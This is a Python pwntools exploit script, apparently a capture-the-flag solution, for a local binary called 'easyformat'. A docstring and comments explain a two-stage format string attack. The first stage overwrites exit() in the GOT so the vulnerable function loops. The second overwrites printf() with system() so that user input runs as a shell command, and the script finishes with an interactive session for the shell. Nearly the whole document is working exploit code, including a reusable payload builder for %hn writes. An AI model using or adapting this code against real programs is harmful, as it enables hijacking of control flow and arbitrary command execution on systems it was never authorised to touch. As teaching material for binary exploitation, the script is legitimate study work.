"""
This version of the script does not jump to a buffer with the shellcode.
Instead, we aim to call system(). We can't simply overwrite exit() in the GOT
with the address of system, as exit() is called with a fixed parameter that we
can't control, while we need to call system('/bin/sh'). Instead, we notice that
printf() is called with user input. We can thus overwrite printf() in the GOT
with the address of system. To be able to invoke this hijacked printf, we also
overwrite exit() in the GOT with the address of the start of the function vuln,
so the program's execution restarts and printf()-now-system gets called with
user input.
"""

from pwn import *

p = process('./easyformat')
f = elf.ELF('./easyformat')

# The displacement on the stack of the start of our format string
# We can infer the displacement by using a debugger or by running the program
# and dump the stack using %x placeholders.
displacement = 4

# We are overwriting exit in the GOT with the address of the start of the
# function vuln, and printf in the GOT with the address of system in the libc.
exit_got = f.got['exit']
printf_got = f.got['printf']
vuln_symbol = f.symbols['vuln']
system_address = 0xf7e089e0 # we can use a debugger (gdb) to get it

def calculate_format_string(what_to_write, where_to_write, displacement):
    if (what_to_write >> 16) > (what_to_write & 0xffff):
        first_addr = where_to_write
        second_addr = where_to_write + 2
        first_half = what_to_write & 0xffff
        second_half = what_to_write >> 16
    else:
        first_addr = where_to_write + 2
        second_addr = where_to_write
        first_half = what_to_write >> 16
        second_half = what_to_write & 0xffff
    return p32(first_addr) + p32(second_addr) + \
           "%{}c%{}$hn".format(first_half - 8, displacement) + \
           "%{}c%{}$hn".format(second_half - first_half, displacement + 1)

# First step of the exploit: use a format string vulnerability to overwrite
# exit in the GOT with the address of vuln, so that the program restarts again.
# When the program restarts, we use another format string vulnerability to
# overwrite printf.

what_to_write = vuln_symbol
where_to_write = exit_got

format_string = calculate_format_string(what_to_write, where_to_write, displacement)

p.sendline(format_string)

# Second step of the exploit: use a format string vulnerability to overwrite
# printf in the GOT with the address of system in the libc.

what_to_write = system_address
where_to_write = printf_got

format_string = calculate_format_string(what_to_write, where_to_write, displacement)

p.sendline(format_string)

p.interactive()

